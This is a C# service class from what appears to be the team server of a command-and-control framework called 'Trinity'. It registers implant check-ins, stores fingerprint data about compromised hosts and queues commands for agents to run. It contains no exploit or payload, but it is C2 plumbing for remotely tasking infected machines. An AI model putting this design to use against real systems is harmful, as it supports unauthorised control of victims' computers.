//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ BEGINNING OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
using System;
using System.Buffers;
using System.Data;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using TeamServer.Repositories;
using TeamServer.Services.Factories;
using TeamServer.Utils;
using Trinity.Shared.DTOs.Agent;
using Trinity.Shared.DTOs.Checkin;
using Trinity.Shared.DTOs.Task;
using Trinity.Shared.Enums;
using Trinity.Shared.Models;
using Trinity.Shared.Results;
using static Microsoft.EntityFrameworkCore.DbLoggerCategory.Database;
using static Trinity.Shared.Constants.CheckinRequestOffsets;
using static Trinity.Shared.Constants.SectionLayout;


namespace TeamServer.Services
{
    public class AgentService
    {
        private readonly AgentRepository _agentRepo;
        private readonly AgentFactory _agentFactory;
        private readonly TaskRepository _taskRepo;
        private readonly TaskResultRepository _taskResultRepo;
        private readonly TaskResultFactory _taskResultFactory;
        private readonly HostRepository _hostRepo;
        private readonly PayloadRepository _payloadRepo;


        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        public AgentService(AgentRepository agentRepository, TaskRepository taskRepository, AgentFactory agentFactory, TaskResultRepository taskResultRepository, TaskResultFactory taskResultFactory, HostRepository hostRepository, PayloadRepository payloadRepository)
        {
            _agentRepo = agentRepository;
            _agentFactory = agentFactory;
            _taskRepo = taskRepository;
            _taskResultFactory = taskResultFactory;
            _taskResultRepo = taskResultRepository;
            _hostRepo = hostRepository;
            _payloadRepo = payloadRepository;
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        // Checkin 
        public async Task<Result<string>> Checkin(string blob)
        {
            // Decode base64
            var decodedBytes = Util.Base64Decode(blob);
            // Get the UUID
            var blobSpan = new ReadOnlyMemory<byte>(decodedBytes);

            var uuid = System.Text.Encoding.UTF8.GetString(blobSpan.Slice(RequestStartIndex, UUIDOffset).Span);
            var request = blobSpan.Slice(36, blobSpan.Length - 36);

            var agent = await _agentRepo.GetAgentByCheckInUUID(uuid);
            if (agent == null)
            {
                var output = JsonSerializer.Deserialize<IntialCheckInRequest>(request.Span);
                var payload = await _payloadRepo.GetPayloadByUUIDAsync(uuid);

                var agentModel = _agentFactory.Create(output, payload.AES256KEY, 5000, 10, Util.GetEnumValue<Architectures>(payload.Architecture), payload.ID);
                await _agentRepo.CreateAgentAsync(agentModel);
                await _agentRepo.CommitAsync();

                var host = new Trinity.Shared.Models.Host 
                { 
                    AgentID = agentModel.ID, 
                    CPUCount = output.CPUCount, 
                    DiskSize = output.DiskSize, 
                    FreeDisk = output.FreeDisk,
                    OS = output.OS,
                    HostName = output.user,
                    MACAddress = output.macAddress,
                    Motherboard = output.motherboard,
                    RAM = output.RAM
                };
                await _hostRepo.AddHostAsync(host);
                await _hostRepo.CommitAsync();

                return CreateBase64Blob(agentModel.CheckInUUID);
            }

            if (blobSpan.Length.Equals(36))
            {
                goto Get_Task;
            }

            var resultRequest = JsonSerializer.Deserialize<ResultRequest>(request.Span);
            var result = _taskResultFactory.Create(resultRequest);
            await _taskResultRepo.AddTaskResultAsync(result);

            var taskU = await _taskRepo.GetByIdAsync(result.TaskID);
            taskU.StatusID = 4;
            await _taskRepo.CommitAsync();

        Get_Task:
            var task = await _taskRepo.GetTaskFromQueueAsync(agent.ID);

            if (task == null)
            {
                return string.Empty;
            }
            return CreateResponseBlob(agent.CheckInUUID, new CheckinResponse(task.ID, (int)task.CommandType, task.Command, task.CreatedAt));
        }

        private string CreateBase64Blob(string uuid)
        {
            byte[] bytes = Encoding.UTF8.GetBytes(uuid);
            return System.Convert.ToBase64String(bytes);
        }

        private string CreateResponseBlob(string uuid, CheckinResponse response)
        {
            var bufferWriter = new ArrayBufferWriter<byte>();
            //Span<byte> uuidSpan = bufferWriter.GetSpan(uuid.Length);
            //int bytesWritten = System.Text.Encoding.UTF8.GetBytes(uuid, uuidSpan);
            //bufferWriter.Advance(bytesWritten);

            using (var jsonWriter = new Utf8JsonWriter(bufferWriter))
            {
                JsonSerializer.Serialize(jsonWriter, response);
            }

            return System.Convert.ToBase64String(bufferWriter.WrittenSpan);
        }



        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        /// <summary>
        /// Parses an initial check-in binary blob and constructs an IntialCheckInRequest from the extracted fields.
        /// </summary>
        /// <remarks>Parses fields into a list of strings and converts specific items to int or double as
        /// required. Expects at least 13 fields in the sequence (items[0]..items[12]) and the exact field ordering used
        /// by the IntialCheckInRequest constructor. May throw ArgumentNullException for null input,
        /// FormatException/OverflowException on numeric parsing, or ArgumentException/IndexOutOfRangeException if the
        /// blob is malformed or shorter than expected.</remarks>
        /// <param name="blob">Binary blob containing a 36-byte header followed by a sequence of length-prefixed UTF-8 fields. Each field
        /// is encoded as a two-byte ASCII decimal length followed by that many UTF-8 bytes.</param>
        /// <returns>An IntialCheckInRequest populated with the parsed fields in the expected order.</returns>
        private IntialCheckInRequest ProcessIntialCheckin(ReadOnlyMemory<byte> blob) 
        {
            var items = new List<string>();
            int blobLen = blob.Length, baseIndex = UUIDOffset;


            while (baseIndex < blobLen)
            {
                var size = int.Parse(blob.Slice(baseIndex, SizeOffset).Span);
                baseIndex = baseIndex + SizeOffset;
                var payload = System.Text.Encoding.UTF8.GetString(blob.Slice(baseIndex, size).Span);
                items.Add(payload);
                baseIndex = baseIndex + size;
            }

            return new IntialCheckInRequest(items[0], items[1], items[2], items[3], items[4],
                int.Parse(items[5]), items[6], items[7], items[8], int.Parse(items[9]),
                double.Parse(items[10]), double.Parse(items[11]), int.Parse(items[12]));
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        private List<ResultRequest> ProcessFullyEstablishedCheckin(ReadOnlyMemory<byte> blob)
        {
            var results = new List<ResultRequest>();
            var countSlice = blob.Slice(UUIDOffset, CountOffset);
            var count = int.Parse(countSlice.Span);
            var resultPayload = blob.Slice(ResultsOffset, blob.Length - ResultsOffset);

            for (int i = 0; i < count; i++)
            {
                var result = ProcessResult(resultPayload);
                results.Add(result);
            }

            return results;
        }

        private ResultRequest ProcessResult(ReadOnlyMemory<byte> result)
        {
            var taskID = int.Parse(result.Slice(ResultStartIndex, ResultIDOffset).Span);
            var status = int.Parse(result.Slice(ResultStatusStartIndex, ResultStatusOffset).Span);
            var size = int.Parse(result.Slice(ResultSizeStartIndex, ResultSizeOffset).Span);
            var payload = System.Text.Encoding.UTF8.GetString(result.Slice(ResultOutputStartIndex, size).Span);

            return new ResultRequest(taskID, "success", payload);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        // GetAgentInfo

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        // GetAgents => filters : campaign
        public async Task<Result<List<AgentResponse>>> GetAgentsAsync()
        {
            return await _agentRepo.GetAgentsAsync();
        }

    }
}
//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ END OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//